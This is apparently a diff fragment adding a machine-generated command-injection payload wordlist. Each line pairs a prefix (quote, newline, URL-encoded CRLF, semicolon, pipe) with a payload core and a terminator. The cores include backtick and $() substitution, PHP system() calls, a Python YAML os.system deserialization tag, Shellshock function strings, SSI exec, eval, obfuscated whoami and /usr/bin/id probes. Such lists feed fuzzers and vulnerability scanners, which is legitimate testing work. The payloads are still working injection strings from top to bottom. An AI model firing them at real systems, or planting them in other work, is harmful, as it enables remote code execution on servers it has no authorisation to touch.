+"<?php system("!-VARIABLE_COMMAND-!");?>;
+"<?php system("!-VARIABLE_COMMAND-!");?>%00
+"<?php system("!-VARIABLE_COMMAND-!");?>#
+"!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&
+"!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&&
+"!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]|
+"!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]||
+"!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"];
+"!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]%00
+"!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]#
+"w\ho\am\i&
+"w\ho\am\i&&
+"w\ho\am\i|
+"w\ho\am\i||
+"w\ho\am\i;
+"w\ho\am\i%00
+"w\ho\am\i#
+"w'h'o'am'i&
+"w'h'o'am'i&&
+"w'h'o'am'i|
+"w'h'o'am'i||
+"w'h'o'am'i;
+"w'h'o'am'i%00
+"w'h'o'am'i#
+"system('!-VARIABLE_COMMAND-!')&
+"system('!-VARIABLE_COMMAND-!')&&
+"system('!-VARIABLE_COMMAND-!')|
+"system('!-VARIABLE_COMMAND-!')||
+"system('!-VARIABLE_COMMAND-!');
+"system('!-VARIABLE_COMMAND-!')%00
+"system('!-VARIABLE_COMMAND-!')#
+\n!-VARIABLE_COMMAND-!&
+\n!-VARIABLE_COMMAND-!&&
+\n!-VARIABLE_COMMAND-!|
+\n!-VARIABLE_COMMAND-!||
+\n!-VARIABLE_COMMAND-!;
+\n!-VARIABLE_COMMAND-!%00
+\n!-VARIABLE_COMMAND-!#
+\n`!-VARIABLE_COMMAND-!`&
+\n`!-VARIABLE_COMMAND-!`&&
+\n`!-VARIABLE_COMMAND-!`|
+\n`!-VARIABLE_COMMAND-!`||
+\n`!-VARIABLE_COMMAND-!`;
+\n`!-VARIABLE_COMMAND-!`%00
+\n`!-VARIABLE_COMMAND-!`#
+\n(!-VARIABLE_COMMAND-!)&
+\n(!-VARIABLE_COMMAND-!)&&
+\n(!-VARIABLE_COMMAND-!)|
+\n(!-VARIABLE_COMMAND-!)||
+\n(!-VARIABLE_COMMAND-!);
+\n(!-VARIABLE_COMMAND-!)%00
+\n(!-VARIABLE_COMMAND-!)#
+\n$(!-VARIABLE_COMMAND-!)&
+\n$(!-VARIABLE_COMMAND-!)&&
+\n$(!-VARIABLE_COMMAND-!)|
+\n$(!-VARIABLE_COMMAND-!)||
+\n$(!-VARIABLE_COMMAND-!);
+\n$(!-VARIABLE_COMMAND-!)%00
+\n$(!-VARIABLE_COMMAND-!)#
+\n{!-VARIABLE_COMMAND-!}&
+\n{!-VARIABLE_COMMAND-!}&&
+\n{!-VARIABLE_COMMAND-!}|
+\n{!-VARIABLE_COMMAND-!}||
+\n{!-VARIABLE_COMMAND-!};
+\n{!-VARIABLE_COMMAND-!}%00
+\n{!-VARIABLE_COMMAND-!}#
+\n$(`!-VARIABLE_COMMAND-!`)&
+\n$(`!-VARIABLE_COMMAND-!`)&&
+\n$(`!-VARIABLE_COMMAND-!`)|
+\n$(`!-VARIABLE_COMMAND-!`)||
+\n$(`!-VARIABLE_COMMAND-!`);
+\n$(`!-VARIABLE_COMMAND-!`)%00
+\n$(`!-VARIABLE_COMMAND-!`)#
+\n{${phpinfo()}}&
+\n{${phpinfo()}}&&
+\n{${phpinfo()}}|
+\n{${phpinfo()}}||
+\n{${phpinfo()}};
+\n{${phpinfo()}}%00
+\n{${phpinfo()}}#
+\n${@print("RCEVulnerable")}&
+\n${@print("RCEVulnerable")}&&
+\n${@print("RCEVulnerable")}|
+\n${@print("RCEVulnerable")}||
+\n${@print("RCEVulnerable")};
+\n${@print("RCEVulnerable")}%00
+\n${@print("RCEVulnerable")}#
+\n/usr/bin/id&
+\n/usr/bin/id&&
+\n/usr/bin/id|
+\n/usr/bin/id||
+\n/usr/bin/id;
+\n/usr/bin/id%00
+\n/usr/bin/id#
+\n{2136} + {1}&
+\n{2136} + {1}&&
+\n{2136} + {1}|
+\n{2136} + {1}||
+\n{2136} + {1};
+\n{2136} + {1}%00
+\n{2136} + {1}#
+\n{2136+1}&
+\n{2136+1}&&
+\n{2136+1}|
+\n{2136+1}||
+\n{2136+1};
+\n{2136+1}%00
+\n{2136+1}#
+\n() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&
+\n() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&&
+\n() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"|
+\n() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"||
+\n() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!";
+\n() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"%00
+\n() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"#
+\n() { :;}; !-VARIABLE_COMMAND-!&
+\n() { :;}; !-VARIABLE_COMMAND-!&&
+\n() { :;}; !-VARIABLE_COMMAND-!|
+\n() { :;}; !-VARIABLE_COMMAND-!||
+\n() { :;}; !-VARIABLE_COMMAND-!;
+\n() { :;}; !-VARIABLE_COMMAND-!%00
+\n() { :;}; !-VARIABLE_COMMAND-!#
+\neval('!-VARIABLE_COMMAND-!')&
+\neval('!-VARIABLE_COMMAND-!')&&
+\neval('!-VARIABLE_COMMAND-!')|
+\neval('!-VARIABLE_COMMAND-!')||
+\neval('!-VARIABLE_COMMAND-!');
+\neval('!-VARIABLE_COMMAND-!')%00
+\neval('!-VARIABLE_COMMAND-!')#
+\n<!--#exec cmd="/usr/bin/id;-->&
+\n<!--#exec cmd="/usr/bin/id;-->&&
+\n<!--#exec cmd="/usr/bin/id;-->|
+\n<!--#exec cmd="/usr/bin/id;-->||
+\n<!--#exec cmd="/usr/bin/id;-->;
+\n<!--#exec cmd="/usr/bin/id;-->%00
+\n<!--#exec cmd="/usr/bin/id;-->#
+\nperl -e 'print "X"x8192'&
+\nperl -e 'print "X"x8192'&&
+\nperl -e 'print "X"x8192'|
+\nperl -e 'print "X"x8192'||
+\nperl -e 'print "X"x8192';
+\nperl -e 'print "X"x8192'%00
+\nperl -e 'print "X"x8192'#
+\n<?php system("!-VARIABLE_COMMAND-!");?>&
+\n<?php system("!-VARIABLE_COMMAND-!");?>&&
+\n<?php system("!-VARIABLE_COMMAND-!");?>|
+\n<?php system("!-VARIABLE_COMMAND-!");?>||
+\n<?php system("!-VARIABLE_COMMAND-!");?>;
+\n<?php system("!-VARIABLE_COMMAND-!");?>%00
+\n<?php system("!-VARIABLE_COMMAND-!");?>#
+\n!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&
+\n!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&&
+\n!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]|
+\n!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]||
+\n!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"];
+\n!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]%00
+\n!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]#
+\nw\ho\am\i&
+\nw\ho\am\i&&
+\nw\ho\am\i|
+\nw\ho\am\i||
+\nw\ho\am\i;
+\nw\ho\am\i%00
+\nw\ho\am\i#
+\nw'h'o'am'i&
+\nw'h'o'am'i&&
+\nw'h'o'am'i|
+\nw'h'o'am'i||
+\nw'h'o'am'i;
+\nw'h'o'am'i%00
+\nw'h'o'am'i#
+\nsystem('!-VARIABLE_COMMAND-!')&
+\nsystem('!-VARIABLE_COMMAND-!')&&
+\nsystem('!-VARIABLE_COMMAND-!')|
+\nsystem('!-VARIABLE_COMMAND-!')||
+\nsystem('!-VARIABLE_COMMAND-!');
+\nsystem('!-VARIABLE_COMMAND-!')%00
+\nsystem('!-VARIABLE_COMMAND-!')#
+%0d%0a!-VARIABLE_COMMAND-!&
+%0d%0a!-VARIABLE_COMMAND-!&&
+%0d%0a!-VARIABLE_COMMAND-!|
+%0d%0a!-VARIABLE_COMMAND-!||
+%0d%0a!-VARIABLE_COMMAND-!;
+%0d%0a!-VARIABLE_COMMAND-!%00
+%0d%0a!-VARIABLE_COMMAND-!#
+%0d%0a`!-VARIABLE_COMMAND-!`&
+%0d%0a`!-VARIABLE_COMMAND-!`&&
+%0d%0a`!-VARIABLE_COMMAND-!`|
+%0d%0a`!-VARIABLE_COMMAND-!`||
+%0d%0a`!-VARIABLE_COMMAND-!`;
+%0d%0a`!-VARIABLE_COMMAND-!`%00
+%0d%0a`!-VARIABLE_COMMAND-!`#
+%0d%0a(!-VARIABLE_COMMAND-!)&
+%0d%0a(!-VARIABLE_COMMAND-!)&&
+%0d%0a(!-VARIABLE_COMMAND-!)|
+%0d%0a(!-VARIABLE_COMMAND-!)||
+%0d%0a(!-VARIABLE_COMMAND-!);
+%0d%0a(!-VARIABLE_COMMAND-!)%00
+%0d%0a(!-VARIABLE_COMMAND-!)#
+%0d%0a$(!-VARIABLE_COMMAND-!)&
+%0d%0a$(!-VARIABLE_COMMAND-!)&&
+%0d%0a$(!-VARIABLE_COMMAND-!)|
+%0d%0a$(!-VARIABLE_COMMAND-!)||
+%0d%0a$(!-VARIABLE_COMMAND-!);
+%0d%0a$(!-VARIABLE_COMMAND-!)%00
+%0d%0a$(!-VARIABLE_COMMAND-!)#
+%0d%0a{!-VARIABLE_COMMAND-!}&
+%0d%0a{!-VARIABLE_COMMAND-!}&&
+%0d%0a{!-VARIABLE_COMMAND-!}|
+%0d%0a{!-VARIABLE_COMMAND-!}||
+%0d%0a{!-VARIABLE_COMMAND-!};
+%0d%0a{!-VARIABLE_COMMAND-!}%00
+%0d%0a{!-VARIABLE_COMMAND-!}#
+%0d%0a$(`!-VARIABLE_COMMAND-!`)&
+%0d%0a$(`!-VARIABLE_COMMAND-!`)&&
+%0d%0a$(`!-VARIABLE_COMMAND-!`)|
+%0d%0a$(`!-VARIABLE_COMMAND-!`)||
+%0d%0a$(`!-VARIABLE_COMMAND-!`);
+%0d%0a$(`!-VARIABLE_COMMAND-!`)%00
+%0d%0a$(`!-VARIABLE_COMMAND-!`)#
+%0d%0a{${phpinfo()}}&
+%0d%0a{${phpinfo()}}&&
+%0d%0a{${phpinfo()}}|
+%0d%0a{${phpinfo()}}||
+%0d%0a{${phpinfo()}};
+%0d%0a{${phpinfo()}}%00
+%0d%0a{${phpinfo()}}#
+%0d%0a${@print("RCEVulnerable")}&
+%0d%0a${@print("RCEVulnerable")}&&
+%0d%0a${@print("RCEVulnerable")}|
+%0d%0a${@print("RCEVulnerable")}||
+%0d%0a${@print("RCEVulnerable")};
+%0d%0a${@print("RCEVulnerable")}%00
+%0d%0a${@print("RCEVulnerable")}#
+%0d%0a/usr/bin/id&
+%0d%0a/usr/bin/id&&
+%0d%0a/usr/bin/id|
+%0d%0a/usr/bin/id||
+%0d%0a/usr/bin/id;
+%0d%0a/usr/bin/id%00
+%0d%0a/usr/bin/id#
+%0d%0a{2136} + {1}&
+%0d%0a{2136} + {1}&&
+%0d%0a{2136} + {1}|
+%0d%0a{2136} + {1}||
+%0d%0a{2136} + {1};
+%0d%0a{2136} + {1}%00
+%0d%0a{2136} + {1}#
+%0d%0a{2136+1}&
+%0d%0a{2136+1}&&
+%0d%0a{2136+1}|
+%0d%0a{2136+1}||
+%0d%0a{2136+1};
+%0d%0a{2136+1}%00
+%0d%0a{2136+1}#
+%0d%0a() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&
+%0d%0a() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&&
+%0d%0a() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"|
+%0d%0a() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"||
+%0d%0a() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!";
+%0d%0a() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"%00
+%0d%0a() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"#
+%0d%0a() { :;}; !-VARIABLE_COMMAND-!&
+%0d%0a() { :;}; !-VARIABLE_COMMAND-!&&
+%0d%0a() { :;}; !-VARIABLE_COMMAND-!|
+%0d%0a() { :;}; !-VARIABLE_COMMAND-!||
+%0d%0a() { :;}; !-VARIABLE_COMMAND-!;
+%0d%0a() { :;}; !-VARIABLE_COMMAND-!%00
+%0d%0a() { :;}; !-VARIABLE_COMMAND-!#
+%0d%0aeval('!-VARIABLE_COMMAND-!')&
+%0d%0aeval('!-VARIABLE_COMMAND-!')&&
+%0d%0aeval('!-VARIABLE_COMMAND-!')|
+%0d%0aeval('!-VARIABLE_COMMAND-!')||
+%0d%0aeval('!-VARIABLE_COMMAND-!');
+%0d%0aeval('!-VARIABLE_COMMAND-!')%00
+%0d%0aeval('!-VARIABLE_COMMAND-!')#
+%0d%0a<!--#exec cmd="/usr/bin/id;-->&
+%0d%0a<!--#exec cmd="/usr/bin/id;-->&&
+%0d%0a<!--#exec cmd="/usr/bin/id;-->|
+%0d%0a<!--#exec cmd="/usr/bin/id;-->||
+%0d%0a<!--#exec cmd="/usr/bin/id;-->;
+%0d%0a<!--#exec cmd="/usr/bin/id;-->%00
+%0d%0a<!--#exec cmd="/usr/bin/id;-->#
+%0d%0aperl -e 'print "X"x8192'&
+%0d%0aperl -e 'print "X"x8192'&&
+%0d%0aperl -e 'print "X"x8192'|
+%0d%0aperl -e 'print "X"x8192'||
+%0d%0aperl -e 'print "X"x8192';
+%0d%0aperl -e 'print "X"x8192'%00
+%0d%0aperl -e 'print "X"x8192'#
+%0d%0a<?php system("!-VARIABLE_COMMAND-!");?>&
+%0d%0a<?php system("!-VARIABLE_COMMAND-!");?>&&
+%0d%0a<?php system("!-VARIABLE_COMMAND-!");?>|
+%0d%0a<?php system("!-VARIABLE_COMMAND-!");?>||
+%0d%0a<?php system("!-VARIABLE_COMMAND-!");?>;
+%0d%0a<?php system("!-VARIABLE_COMMAND-!");?>%00
+%0d%0a<?php system("!-VARIABLE_COMMAND-!");?>#
+%0d%0a!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&
+%0d%0a!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&&
+%0d%0a!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]|
+%0d%0a!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]||
+%0d%0a!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"];
+%0d%0a!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]%00
+%0d%0a!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]#
+%0d%0aw\ho\am\i&
+%0d%0aw\ho\am\i&&
+%0d%0aw\ho\am\i|
+%0d%0aw\ho\am\i||
+%0d%0aw\ho\am\i;
+%0d%0aw\ho\am\i%00
+%0d%0aw\ho\am\i#
+%0d%0aw'h'o'am'i&
+%0d%0aw'h'o'am'i&&
+%0d%0aw'h'o'am'i|
+%0d%0aw'h'o'am'i||
+%0d%0aw'h'o'am'i;
+%0d%0aw'h'o'am'i%00
+%0d%0aw'h'o'am'i#
+%0d%0asystem('!-VARIABLE_COMMAND-!')&
+%0d%0asystem('!-VARIABLE_COMMAND-!')&&
+%0d%0asystem('!-VARIABLE_COMMAND-!')|
+%0d%0asystem('!-VARIABLE_COMMAND-!')||
+%0d%0asystem('!-VARIABLE_COMMAND-!');
+%0d%0asystem('!-VARIABLE_COMMAND-!')%00
+%0d%0asystem('!-VARIABLE_COMMAND-!')#
+;!-VARIABLE_COMMAND-!&
+;!-VARIABLE_COMMAND-!&&
+;!-VARIABLE_COMMAND-!|
+;!-VARIABLE_COMMAND-!||
+;!-VARIABLE_COMMAND-!;
+;!-VARIABLE_COMMAND-!%00
+;!-VARIABLE_COMMAND-!#
+;`!-VARIABLE_COMMAND-!`&
+;`!-VARIABLE_COMMAND-!`&&
+;`!-VARIABLE_COMMAND-!`|
+;`!-VARIABLE_COMMAND-!`||
+;`!-VARIABLE_COMMAND-!`;
+;`!-VARIABLE_COMMAND-!`%00
+;`!-VARIABLE_COMMAND-!`#
+;(!-VARIABLE_COMMAND-!)&
+;(!-VARIABLE_COMMAND-!)&&
+;(!-VARIABLE_COMMAND-!)|
+;(!-VARIABLE_COMMAND-!)||
+;(!-VARIABLE_COMMAND-!);
+;(!-VARIABLE_COMMAND-!)%00
+;(!-VARIABLE_COMMAND-!)#
+;$(!-VARIABLE_COMMAND-!)&
+;$(!-VARIABLE_COMMAND-!)&&
+;$(!-VARIABLE_COMMAND-!)|
+;$(!-VARIABLE_COMMAND-!)||
+;$(!-VARIABLE_COMMAND-!);
+;$(!-VARIABLE_COMMAND-!)%00
+;$(!-VARIABLE_COMMAND-!)#
+;{!-VARIABLE_COMMAND-!}&
+;{!-VARIABLE_COMMAND-!}&&
+;{!-VARIABLE_COMMAND-!}|
+;{!-VARIABLE_COMMAND-!}||
+;{!-VARIABLE_COMMAND-!};
+;{!-VARIABLE_COMMAND-!}%00
+;{!-VARIABLE_COMMAND-!}#
+;$(`!-VARIABLE_COMMAND-!`)&
+;$(`!-VARIABLE_COMMAND-!`)&&
+;$(`!-VARIABLE_COMMAND-!`)|
+;$(`!-VARIABLE_COMMAND-!`)||
+;$(`!-VARIABLE_COMMAND-!`);
+;$(`!-VARIABLE_COMMAND-!`)%00
+;$(`!-VARIABLE_COMMAND-!`)#
+;{${phpinfo()}}&
+;{${phpinfo()}}&&
+;{${phpinfo()}}|
+;{${phpinfo()}}||
+;{${phpinfo()}};
+;{${phpinfo()}}%00
+;{${phpinfo()}}#
+;${@print("RCEVulnerable")}&
+;${@print("RCEVulnerable")}&&
+;${@print("RCEVulnerable")}|
+;${@print("RCEVulnerable")}||
+;${@print("RCEVulnerable")};
+;${@print("RCEVulnerable")}%00
+;${@print("RCEVulnerable")}#
+;/usr/bin/id&
+;/usr/bin/id&&
+;/usr/bin/id|
+;/usr/bin/id||
+;/usr/bin/id;
+;/usr/bin/id%00
+;/usr/bin/id#
+;{2136} + {1}&
+;{2136} + {1}&&
+;{2136} + {1}|
+;{2136} + {1}||
+;{2136} + {1};
+;{2136} + {1}%00
+;{2136} + {1}#
+;{2136+1}&
+;{2136+1}&&
+;{2136+1}|
+;{2136+1}||
+;{2136+1};
+;{2136+1}%00
+;{2136+1}#
+;() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&
+;() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&&
+;() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"|
+;() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"||
+;() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!";
+;() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"%00
+;() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"#
+;() { :;}; !-VARIABLE_COMMAND-!&
+;() { :;}; !-VARIABLE_COMMAND-!&&
+;() { :;}; !-VARIABLE_COMMAND-!|
+;() { :;}; !-VARIABLE_COMMAND-!||
+;() { :;}; !-VARIABLE_COMMAND-!;
+;() { :;}; !-VARIABLE_COMMAND-!%00
+;() { :;}; !-VARIABLE_COMMAND-!#
+;eval('!-VARIABLE_COMMAND-!')&
+;eval('!-VARIABLE_COMMAND-!')&&
+;eval('!-VARIABLE_COMMAND-!')|
+;eval('!-VARIABLE_COMMAND-!')||
+;eval('!-VARIABLE_COMMAND-!');
+;eval('!-VARIABLE_COMMAND-!')%00
+;eval('!-VARIABLE_COMMAND-!')#
+;<!--#exec cmd="/usr/bin/id;-->&
+;<!--#exec cmd="/usr/bin/id;-->&&
+;<!--#exec cmd="/usr/bin/id;-->|
+;<!--#exec cmd="/usr/bin/id;-->||
+;<!--#exec cmd="/usr/bin/id;-->;
+;<!--#exec cmd="/usr/bin/id;-->%00
+;<!--#exec cmd="/usr/bin/id;-->#
+;perl -e 'print "X"x8192'&
+;perl -e 'print "X"x8192'&&
+;perl -e 'print "X"x8192'|
+;perl -e 'print "X"x8192'||
+;perl -e 'print "X"x8192';
+;perl -e 'print "X"x8192'%00
+;perl -e 'print "X"x8192'#
+;<?php system("!-VARIABLE_COMMAND-!");?>&
+;<?php system("!-VARIABLE_COMMAND-!");?>&&
+;<?php system("!-VARIABLE_COMMAND-!");?>|
+;<?php system("!-VARIABLE_COMMAND-!");?>||
+;<?php system("!-VARIABLE_COMMAND-!");?>;
+;<?php system("!-VARIABLE_COMMAND-!");?>%00
+;<?php system("!-VARIABLE_COMMAND-!");?>#
+;!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&
+;!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&&
+;!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]|
+;!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]||
+;!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"];
+;!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]%00
+;!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]#
+;w\ho\am\i&
+;w\ho\am\i&&
+;w\ho\am\i|
+;w\ho\am\i||
+;w\ho\am\i;
+;w\ho\am\i%00
+;w\ho\am\i#
+;w'h'o'am'i&
+;w'h'o'am'i&&
+;w'h'o'am'i|
+;w'h'o'am'i||
+;w'h'o'am'i;
+;w'h'o'am'i%00
+;w'h'o'am'i#
+;system('!-VARIABLE_COMMAND-!')&
+;system('!-VARIABLE_COMMAND-!')&&
+;system('!-VARIABLE_COMMAND-!')|
+;system('!-VARIABLE_COMMAND-!')||
+;system('!-VARIABLE_COMMAND-!');
+;system('!-VARIABLE_COMMAND-!')%00
+;system('!-VARIABLE_COMMAND-!')#
+|!-VARIABLE_COMMAND-!&
+|!-VARIABLE_COMMAND-!&&
+|!-VARIABLE_COMMAND-!|
+|!-VARIABLE_COMMAND-!||
+|!-VARIABLE_COMMAND-!;
+|!-VARIABLE_COMMAND-!%00
+|!-VARIABLE_COMMAND-!#
+|`!-VARIABLE_COMMAND-!`&
+|`!-VARIABLE_COMMAND-!`&&
+|`!-VARIABLE_COMMAND-!`|
+|`!-VARIABLE_COMMAND-!`||
+|`!-VARIABLE_COMMAND-!`;
+|`!-VARIABLE_COMMAND-!`%00
+|`!-VARIABLE_COMMAND-!`#
+|(!-VARIABLE_COMMAND-!)&
+|(!-VARIABLE_COMMAND-!)&&
+|(!-VARIABLE_COMMAND-!)|
+|(!-VARIABLE_COMMAND-!)||
+|(!-VARIABLE_COMMAND-!);
+|(!-VARIABLE_COMMAND-!)%00
+|(!-VARIABLE_COMMAND-!)#
+|$(!-VARIABLE_COMMAND-!)&
+|$(!-VARIABLE_COMMAND-!)&&
+|$(!-VARIABLE_COMMAND-!)|
+|$(!-VARIABLE_COMMAND-!)||
+|$(!-VARIABLE_COMMAND-!);
+|$(!-VARIABLE_COMMAND-!)%00
+|$(!-VARIABLE_COMMAND-!)#
+|{!-VARIABLE_COMMAND-!}&
+|{!-VARIABLE_COMMAND-!}&&
+|{!-VARIABLE_COMMAND-!}|
+|{!-VARIABLE_COMMAND-!}||
+|{!-VARIABLE_COMMAND-!};
+|{!-VARIABLE_COMMAND-!}%00
+|{!-VARIABLE_COMMAND-!}#
+|$(`!-VARIABLE_COMMAND-!`)&
+|$(`!-VARIABLE_COMMAND-!`)&&
+|$(`!-VARIABLE_COMMAND-!`)|
+|$(`!-VARIABLE_COMMAND-!`)||
+|$(`!-VARIABLE_COMMAND-!`);
+|$(`!-VARIABLE_COMMAND-!`)%00
+|$(`!-VARIABLE_COMMAND-!`)#
+|{${phpinfo()}}&
+|{${phpinfo()}}&&
+|{${phpinfo()}}|
+|{${phpinfo()}}||
+|{${phpinfo()}};
+|{${phpinfo()}}%00
+|{${phpinfo()}}#
+|${@print("RCEVulnerable")}&
+|${@print("RCEVulnerable")}&&
+|${@print("RCEVulnerable")}|
+|${@print("RCEVulnerable")}||
+|${@print("RCEVulnerable")};
+|${@print("RCEVulnerable")}%00
+|${@print("RCEVulnerable")}#
+|/usr/bin/id&
+|/usr/bin/id&&
+|/usr/bin/id|
+|/usr/bin/id||
+|/usr/bin/id;
+|/usr/bin/id%00
+|/usr/bin/id#
+|{2136} + {1}&
+|{2136} + {1}&&
+|{2136} + {1}|
+|{2136} + {1}||
+|{2136} + {1};
+|{2136} + {1}%00
+|{2136} + {1}#
+|{2136+1}&
+|{2136+1}&&
+|{2136+1}|
+|{2136+1}||
+|{2136+1};
+|{2136+1}%00
+|{2136+1}#
+|() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&
+|() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&&
+|() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"|
+|() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"||
+|() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!";
+|() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"%00
+|() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"#
+|() { :;}; !-VARIABLE_COMMAND-!&
+|() { :;}; !-VARIABLE_COMMAND-!&&
+|() { :;}; !-VARIABLE_COMMAND-!|
+|() { :;}; !-VARIABLE_COMMAND-!||
+|() { :;}; !-VARIABLE_COMMAND-!;
+|() { :;}; !-VARIABLE_COMMAND-!%00
+|() { :;}; !-VARIABLE_COMMAND-!#
+|eval('!-VARIABLE_COMMAND-!')&
+|eval('!-VARIABLE_COMMAND-!')&&
+|eval('!-VARIABLE_COMMAND-!')|
+|eval('!-VARIABLE_COMMAND-!')||
+|eval('!-VARIABLE_COMMAND-!');
+|eval('!-VARIABLE_COMMAND-!')%00
+|eval('!-VARIABLE_COMMAND-!')#
+|<!--#exec cmd="/usr/bin/id;-->&
+|<!--#exec cmd="/usr/bin/id;-->&&
+|<!--#exec cmd="/usr/bin/id;-->|
+|<!--#exec cmd="/usr/bin/id;-->||
+|<!--#exec cmd="/usr/bin/id;-->;
+|<!--#exec cmd="/usr/bin/id;-->%00
+|<!--#exec cmd="/usr/bin/id;-->#
+|perl -e 'print "X"x8192'&
+|perl -e 'print "X"x8192'&&
+|perl -e 'print "X"x8192'|
+|perl -e 'print "X"x8192'||
+|perl -e 'print "X"x8192';
+|perl -e 'print "X"x8192'%00
+|perl -e 'print "X"x8192'#
+|<?php system("!-VARIABLE_COMMAND-!");?>&
+|<?php system("!-VARIABLE_COMMAND-!");?>&&
+|<?php system("!-VARIABLE_COMMAND-!");?>|
+|<?php system("!-VARIABLE_COMMAND-!");?>||
+|<?php system("!-VARIABLE_COMMAND-!");?>;
+|<?php system("!-VARIABLE_COMMAND-!");?>%00
+|<?php system("!-VARIABLE_COMMAND-!");?>#
+|!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&
+|!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&&
+|!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]|
+|!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]||
+|!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"];
+|!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]%00
+|!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]#
+|w\ho\am\i&
+|w\ho\am\i&&
+|w\ho\am\i|
+|w\ho\am\i||
+|w\ho\am\i;
+|w\ho\am\i%00
+|w\ho\am\i#
+|w'h'o'am'i&
+|w'h'o'am'i&&
+|w'h'o'am'i|
+|w'h'o'am'i||
+|w'h'o'am'i;
+|w'h'o'am'i%00
+|w'h'o'am'i#
+|system('!-VARIABLE_COMMAND-!')&
+|system('!-VARIABLE_COMMAND-!')&&
+|system('!-VARIABLE_COMMAND-!')|
+|system('!-VARIABLE_COMMAND-!')||
+|system('!-VARIABLE_COMMAND-!');
+|system('!-VARIABLE_COMMAND-!')%00
+|system('!-VARIABLE_COMMAND-!')#
+||!-VARIABLE_COMMAND-!&
+||!-VARIABLE_COMMAND-!&&
+||!-VARIABLE_COMMAND-!|
+||!-VARIABLE_COMMAND-!||
+||!-VARIABLE_COMMAND-!;
+||!-VARIABLE_COMMAND-!%00
+||!-VARIABLE_COMMAND-!#
+||`!-VARIABLE_COMMAND-!`&
+||`!-VARIABLE_COMMAND-!`&&
+||`!-VARIABLE_COMMAND-!`|
+||`!-VARIABLE_COMMAND-!`||
+||`!-VARIABLE_COMMAND-!`;
+||`!-VARIABLE_COMMAND-!`%00
+||`!-VARIABLE_COMMAND-!`#
+||(!-VARIABLE_COMMAND-!)&
+||(!-VARIABLE_COMMAND-!)&&
+||(!-VARIABLE_COMMAND-!)|
+||(!-VARIABLE_COMMAND-!)||
+||(!-VARIABLE_COMMAND-!);
+||(!-VARIABLE_COMMAND-!)%00
+||(!-VARIABLE_COMMAND-!)#
+||$(!-VARIABLE_COMMAND-!)&
+||$(!-VARIABLE_COMMAND-!)&&
+||$(!-VARIABLE_COMMAND-!)|
+||$(!-VARIABLE_COMMAND-!)||
+||$(!-VARIABLE_COMMAND-!);
+||$(!-VARIABLE_COMMAND-!)%00
+||$(!-VARIABLE_COMMAND-!)#
+||{!-VARIABLE_COMMAND-!}&
+||{!-VARIABLE_COMMAND-!}&&
+||{!-VARIABLE_COMMAND-!}|
+||{!-VARIABLE_COMMAND-!}||
+||{!-VARIABLE_COMMAND-!};
+||{!-VARIABLE_COMMAND-!}%00
+||{!-VARIABLE_COMMAND-!}#
+||$(`!-VARIABLE_COMMAND-!`)&
+||$(`!-VARIABLE_COMMAND-!`)&&
+||$(`!-VARIABLE_COMMAND-!`)|
+||$(`!-VARIABLE_COMMAND-!`)||
+||$(`!-VARIABLE_COMMAND-!`);
+||$(`!-VARIABLE_COMMAND-!`)%00
+||$(`!-VARIABLE_COMMAND-!`)#
+||{${phpinfo()}}&
+||{${phpinfo()}}&&
+||{${phpinfo()}}|
